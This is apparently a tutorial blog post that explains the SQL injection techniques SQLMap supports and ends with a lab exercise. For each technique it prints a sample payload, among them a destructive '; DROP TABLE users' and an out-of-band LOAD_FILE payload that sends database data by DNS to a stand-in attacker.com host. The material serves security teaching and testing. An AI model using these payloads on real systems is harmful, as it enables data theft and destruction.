---
title: "SQL Injection Types Supported by SQLMap - SQL Map 01"
seoTitle: "SQLMap Guide: Types of SQL Injections Supported"
seoDescription: "Explore the various SQL injection types supported by SQLMap, including Boolean-based, Error-based, and more, with this comprehensive guide"
datePublished: Wed Apr 24 2024 22:32:38 GMT+0000 (Coordinated Universal Time)
cuid: clvee4p05000308lb3ezwe1ne
slug: sql-injection-types-supported-by-sqlmap-sql-map-01
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1713997931561/7c7be6d0-c5b9-4ce1-8617-f26a92818d1c.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1713997935094/a175b61a-1b7c-4ad0-aa7d-9f233874f43b.png
tags: hacking, pentesting, sqlinjection, sqlmap

---

## Objective:

To provide a detailed, step-by-step guide on the various SQL injection types supported by SQLMap, enabling learners to understand and identify each type effectively.

## Introduction to SQLMap

* SQLMap is a powerful penetration testing tool for detecting and exploiting SQL injection vulnerabilities.
    
* It supports a wide range of SQL injection techniques, making it a comprehensive tool for testing web application security.
    

## Listing Supported SQL Injection Types

1. Use the command `sqlmap -hh` to view the list of supported SQL injection techniques.
    
2. The `-technique` option allows you to specify the SQL injection techniques to use.
    
3. The default value for `-technique` is "BEUSTQ", which represents the following techniques:
    
    * B: Boolean-based blind
        
    * E: Error-based
        
    * U: Union query-based
        
    * S: Stacked queries
        
    * T: Time-based blind
        
    * Q: Inline queries
        

## Boolean-based Blind SQL Injection

1. Example payload: `AND 1=1`
    
2. SQLMap exploits this vulnerability by differentiating between TRUE and FALSE query results.
    
3. It retrieves 1 byte of information per request by comparing server responses.
    
4. TRUE results have minimal or no difference from the regular server response.
    
5. FALSE results have substantial differences from the regular server response.
    
6. Boolean-based blind SQL injection is considered the most common type in web applications.
    

## Error-based SQL Injection

1. Example payload: `AND GTID_SUBSET(@@version,0)`
    
2. This technique relies on the DBMS returning error messages as part of the server response.
    
3. SQLMap uses specialized payloads targeting functions that cause known misbehaviors in specific DBMSes.
    
4. It supports error-based SQL injection for various DBMSes, including MySQL, PostgreSQL, Oracle, and more.
    
5. Error-based SQLi is faster than most other types, as it can retrieve data in chunks (e.g., 200 bytes) per request.
    

## UNION Query-based SQL Injection

1. Example payload: `UNION ALL SELECT 1,@@version,3`
    
2. This technique extends the original vulnerable query with the results of injected statements using UNION.
    
3. If the original query results are rendered in the response, the attacker can retrieve additional data from the injected statements.
    
4. UNION query-based SQLi is considered the fastest type, as it can potentially retrieve an entire database table with a single request.
    

## Stacked Queries SQL Injection

1. Example payload: `; DROP TABLE users`
    
2. Also known as "piggy-backing," this technique injects additional SQL statements after the vulnerable one.
    
3. It is useful for running non-query statements like INSERT, UPDATE, or DELETE.
    
4. The vulnerable platform must support stacking queries (e.g., Microsoft SQL Server and PostgreSQL).
    
5. SQLMap can use stacked queries for advanced features like executing OS commands and retrieving data.
    

## Time-based Blind SQL Injection

1. Example payload: `AND 1=IF(2>1,SLEEP(5),0)`
    
2. Similar to boolean-based blind SQLi, this technique uses response time to differentiate between TRUE and FALSE.
    
3. TRUE responses have a noticeable difference in response time compared to regular server responses.
    
4. FALSE responses have response times indistinguishable from regular responses.
    
5. Time-based blind SQLi is slower than boolean-based blind SQLi but is used when the latter is not applicable (e.g., non-query statements).
    

## Inline Queries SQL Injection

1. Example payload: `SELECT (SELECT @@version) from`
    
2. This technique embeds a query within the original query.
    
3. It is uncommon and requires the vulnerable web application to be written in a specific way.
    
4. SQLMap supports this type of SQL injection.
    

## Out-of-band SQL Injection

1. Example payload: `LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.`[`attacker.com`](http://attacker.com)`\\\\README.txt'))`
    
2. This advanced technique is used when other types are unsupported or too slow.
    
3. SQLMap supports out-of-band SQLi through "DNS exfiltration."
    
4. It forces the server to request non-existent subdomains containing the SQL response.
    
5. SQLMap collects these erroring DNS requests to form the entire SQL response.
    

## Checkpoint Exercise

1. Set up a vulnerable web application with SQL injection vulnerabilities.
    
2. Use SQLMap to identify the supported SQL injection types for the application.
    
3. Attempt to exploit the application using each supported SQL injection type.
    
4. Analyze the results and understand the differences between each technique.